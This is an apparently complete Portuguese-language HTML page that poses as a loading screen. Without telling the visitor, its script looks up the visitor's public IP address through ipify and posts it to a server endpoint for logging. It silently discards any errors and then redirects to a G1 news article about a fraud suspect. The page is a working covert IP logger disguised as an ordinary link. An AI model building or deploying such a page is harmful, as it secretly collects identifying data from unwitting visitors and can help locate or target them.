<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <link rel="icon" href="data:," />
  <title>Carregando...</title>
</head>
<body>
  <main class="box">
    <div class="spinner"></div>
    <div id="status">Carregando...</div>
  </main>

  <script>
    async function getPublicIp() {
      const response = await fetch("https://api64.ipify.org?format=json", {
        cache: "no-store"
      });

      if (!response.ok) {
        throw new Error("Falha ao consultar IP.");
      }

      const data = await response.json();
      if (!data.ip) throw new Error("IP não retornado.");
      return data.ip;
    }

    async function register() {
      const status = document.getElementById("status");
      const spinner = document.querySelector(".spinner");

      try {
        const ip = await getPublicIp();

        const response = await fetch("/api/register-ip", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ ip })
        });

        const data = await response.json().catch(() => ({}));

        if (!response.ok) {
          throw new Error(
            data?.baserowError?.detail ||
            data?.baserowError?.error ||
            data?.error ||
            "Falha ao registrar."
          );
        }

        if (data.warning) {
          console.warn(data.warning, data.dateFieldError || "");
        }
		
		window.location.href = "https://g1.globo.com/mg/sul-de-minas/noticia/2026/09/24/mulher-suspeita-de-golpes-de-mais-de-r-1-milhao-e-procurada-pela-policia-no-sul-de-minas.ghtml";

      } catch (error) {
      } finally {
      }
    }

    register();
  </script>
</body>
</html>
